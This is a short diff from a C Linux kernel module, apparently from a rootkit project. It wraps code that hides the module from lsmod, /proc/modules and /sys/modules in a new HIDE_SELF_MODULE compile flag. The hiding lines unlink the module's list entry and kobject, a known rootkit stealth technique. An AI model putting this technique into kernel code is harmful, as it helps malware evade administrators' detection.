@@ -32,8 +32,10 @@ void cuteBabyPleaseDontCry(void) {
     }
 
 #ifdef MODULE
+    #if HIDE_SELF_MODULE == 1
     list_del(&THIS_MODULE->list); //lsmod,/proc/modules
     kobject_del(&THIS_MODULE->mkobj.kobj); // /sys/modules
     list_del(&THIS_MODULE->mkobj.kobj.entry); // kobj struct list_head entry
+    #endif
 #endif
 }
